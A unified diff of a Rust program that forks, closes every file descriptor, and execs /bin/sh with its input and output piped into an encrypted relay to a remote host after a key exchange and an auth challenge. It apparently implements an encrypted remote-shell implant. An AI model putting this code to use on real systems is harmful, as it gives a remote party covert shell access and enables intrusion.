@@ -15,10 +15,9 @@ use kex::{get_local_info, play_auth_challenge_remote, play_dh_kex_remote};
 use rand_chacha::ChaCha20Rng;
 use rand_core::SeedableRng;
 use std::ffi::{c_char, CStr};
-use std::fs::File;
-use std::io::Write;
 use std::net::{SocketAddr, TcpStream};
-use std::os::unix::io::FromRawFd;
+use std::os::unix::io::AsRawFd;
+use std::os::unix::process::CommandExt;
 
 #[allow(unused_imports)]
 use relay::{relay, RelayNode};
@@ -28,9 +27,9 @@ const LOCAL_PORT: u16 = 2000;
 fn get_rand_seed(rand_ptr: *const u64) -> Option<u64> {
     if 0 != rand_ptr as usize {
         // Assuming everything worked out correctly, this dereference should be fine
-        println!("deref rand bytes at: {:#016x}=", rand_ptr as usize);
+        println!("deref rand bytes at: {:#016x}", rand_ptr as usize);
         let result = unsafe { *(rand_ptr) };
-        println!("{:#016x}\n", result);
+        println!("= {:#016x}", result);
         Some(result)
     } else {
         // getauxval(AT_RANDOM) is not available, use /dev/urandom
@@ -57,7 +56,7 @@ pub fn main(argc: i32, argv: *const *const u8, envp: *const *const u8) -> i8 {
     let (ipaddr_l, pub_l) =
         get_local_info(argv_vec).expect("Failed to parse remote pub key and ip addr");
     println!(
-        "Found local's key:\n{:#}\nAnd address: {:#}\n",
+        "Found local's key:\n{:#}\nAnd address: {:#}",
         pub_l.to_string(),
         ipaddr_l,
     );
@@ -80,6 +79,7 @@ pub fn main(argc: i32, argv: *const *const u8, envp: *const *const u8) -> i8 {
     let mut rng = if let Some(seed2) = get_rand_seed(unsafe { rand_ptr.add(1) }) {
         ChaCha20Rng::seed_from_u64(seed2)
     } else {
+        println!("Unable to use seeds, using /dev/urandom");
         ChaCha20Rng::from_entropy()
     };
 
@@ -88,14 +88,45 @@ pub fn main(argc: i32, argv: *const *const u8, envp: *const *const u8) -> i8 {
 
     // TODO: unregister SIGALRM
 
-    // TODO: mkfifo's
-    {
-        let mut node1 = RelayNode {
-            readable: std::io::stdin(),
-            writeable: std::io::stdout(),
-        };
-        // Start up the relay
-        relay(&mut node1, &mut remote, &key, &mut rng).expect("Finished relay");
+    // Make some pipes
+    let (pipein_parent, pipein_child) = os_pipe::pipe().expect("Failed to open pipes");
+    let (pipeout_child, pipeout_parent) = os_pipe::pipe().expect("Failed to open pipes");
+
+    // Fork
+    match unsafe { libc::fork() } {
+        -1 => panic!("Unable to fork"),
+        0 => {
+            // Child:
+            //  - close fds (except _child pipes)
+            //    get the max fd value
+            let fdmax: i32 = unsafe { libc::sysconf(libc::_SC_OPEN_MAX) }
+                .try_into()
+                .unwrap_or(i16::MAX.into());
+            //    convert to integers instead of rust files
+            let (fd0, fd1) = (pipein_child.as_raw_fd(), pipeout_child.as_raw_fd());
+            //    close everything
+            for fd in 0i32..fdmax {
+                if fd != fd0 && fd != fd1 {
+                    unsafe { libc::close(fd) };
+                }
+            }
+            //  - setup /bin/sh command with stdin/stderr/stdout set
+            let mut cmd = std::process::Command::new("/bin/sh");
+            cmd.stdin(pipeout_child)
+                .stderr(pipein_child.try_clone().unwrap())
+                .stdout(pipein_child);
+            //  - tty?
+            //  - exec
+            cmd.exec();
+        }
+        _ => {
+            let mut node1 = RelayNode {
+                readable: pipein_parent,
+                writeable: pipeout_parent,
+            };
+            // Parent: start up the relay
+            relay(&mut node1, &mut remote, &key, &mut rng).expect("Finished relay");
+        }
     }
     return 0;
 }
